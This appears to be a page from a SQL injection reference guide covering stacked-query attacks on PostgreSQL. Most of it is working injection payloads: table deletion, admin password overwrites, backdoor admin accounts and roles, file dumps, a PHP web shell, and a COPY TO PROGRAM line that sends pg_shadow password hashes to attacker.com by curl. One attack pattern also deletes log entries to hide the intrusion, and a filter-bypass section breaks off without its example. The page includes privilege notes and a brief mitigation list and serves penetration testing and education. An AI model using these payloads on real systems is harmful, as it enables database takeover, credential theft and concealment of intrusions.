---
title: Stacked Queries
description: Executing multiple SQL statements in a single injection
category: Injection Techniques
order: 14
tags: ["stacked queries", "multiple statements", "advanced injection"]
lastUpdated: 2025-12-07
---

## Stacked Queries

Stacked queries (also known as query stacking or multi-queries) allow attackers to execute multiple SQL statements in a single injection. PostgreSQL fully supports stacked queries, making it a powerful target for this technique.

### Basic Syntax

In PostgreSQL, multiple SQL statements are separated by semicolons (`;`):

```sql
SELECT * FROM users; DROP TABLE users;
```

### Detection

To test if stacked queries are possible:

```sql
'; SELECT pg_sleep(5)--
```

If the application pauses for 5 seconds, it likely supports stacked queries.

### Prerequisites

Stacked queries work in PostgreSQL when:

1. The database driver supports multiple statements
2. The application doesn't filter semicolons

### Driver Support

| Driver                  | Multi-Statement | With Params | Notes                                             |
| ----------------------- | --------------- | ----------- | ------------------------------------------------- |
| PHP `pg_query()`        | Yes             | N/A         | Simple query protocol; no parameter support       |
| PHP `pg_query_params()` | No              | No          | Server-side prepared; single statement only       |
| psycopg2 (Python)       | Yes             | Yes         | Client-side substitution; returns last result     |
| psycopg3 (Python)       | Yes             | No          | Server-side binding; use ClientCursor for params  |
| node-postgres           | Yes             | No          | Simple query without params; prepared with params |
| JDBC PostgreSQL         | Yes             | Varies      | Use `getMoreResults()` for multiple results       |

**Key differences:**

- **Simple query protocol** (PHP `pg_query()`, node-postgres without params, psycopg3 without params): Sends raw SQL text allowing multiple statements, but has no parameter binding support
- **Client-side substitution** (psycopg2, psycopg3 ClientCursor): Parameters are substituted locally before sending SQL to server, so multi-statements work but this offers no SQL injection protection
- **Server-side prepared statements** (psycopg3 with params, node-postgres with params, PHP `pg_query_params()`): PostgreSQL extended query protocol restricts to single statements; multi-statement queries are rejected

### Examples of Stacked Queries

#### Data Modification

```sql
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

#### Creating New User

```sql
'; INSERT INTO users (username, password, role) VALUES ('attacker', 'password123', 'admin')--
```

#### Privilege Escalation

```sql
'; UPDATE users SET role='admin' WHERE username='guest'--
```

#### Schema Manipulation

```sql
'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255)--
```

### Advanced Exploitation

#### Creating Functions

```sql
'; CREATE OR REPLACE FUNCTION backdoor() RETURNS void AS $$
BEGIN
    EXECUTE 'COPY (SELECT * FROM users) TO ''/tmp/dump.txt''';
END;
$$ LANGUAGE plpgsql--
```

#### Creating Triggers

```sql
'; CREATE TRIGGER evil_trigger
AFTER INSERT ON users
FOR EACH ROW
EXECUTE FUNCTION backdoor()--
```

#### Using COPY for Data Exfiltration

```sql
'; COPY (SELECT * FROM users) TO '/tmp/users.csv'--
```

#### Writing Web Shells

```sql
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
```

### Out-of-Band Data Extraction

Using `COPY ... TO PROGRAM`:

```sql
'; COPY (SELECT passwd FROM pg_shadow) TO PROGRAM 'curl http://attacker.com/?data=$(cat)'--
```

**Privilege requirement:** `COPY ... TO PROGRAM` requires superuser privileges or membership in the `pg_execute_server_program` role (PostgreSQL 11+). This is typically unavailable in common SQL injection scenarios where the database user has restricted privileges.

### Creating Roles

```sql
-- Create superuser (requires existing superuser privileges)
'; CREATE ROLE attacker WITH LOGIN PASSWORD 'password' SUPERUSER--

-- Create regular role (requires CREATEROLE privilege)
'; CREATE ROLE attacker WITH LOGIN PASSWORD 'password'--

-- Grant privileges (requires ownership or GRANT OPTION on target objects)
'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker--
```

**Privilege requirements:**

- Creating a role with `SUPERUSER` requires the attacker to already have superuser access—rarely achievable via typical SQL injection
- Creating regular roles requires the `CREATEROLE` privilege on the current database user
- Granting privileges requires ownership of the target objects or having received those privileges `WITH GRANT OPTION`

These stacked queries are not broadly exploitable without elevated privileges on the compromised database user.

### Practical Attack Pattern

```sql
-- Comprehensive attack
';
-- Check current privileges
SELECT current_user, current_setting('is_superuser');
-- Create backup of target table
CREATE TABLE users_backup AS SELECT * FROM users;
-- Insert backdoor user
INSERT INTO users (username, password, role) VALUES ('backdoor', 'secret', 'admin');
-- Clean up traces
DELETE FROM logs WHERE action LIKE '%backdoor%';
--
```

### Bypassing Filters

PostgreSQL requires semicolons as statement separators - newlines alone do not terminate statements. If semicolons are blocked, true stacked queries are not possible.

However, you can encapsulate multiple statements within a function body using dollar-quoting:

### Limitations

1. Some application frameworks explicitly disable multi-statement queries
2. ORMs often prevent stacked queries
3. Connection poolers may have restrictions
4. WAFs may block semicolons in input

### Mitigation

To prevent stacked query attacks:

1. Use parameterized queries/prepared statements
2. Disable multi-statement support in database drivers
3. Implement proper input validation
4. Use least-privilege database accounts
5. Deploy a WAF to detect SQL injection patterns
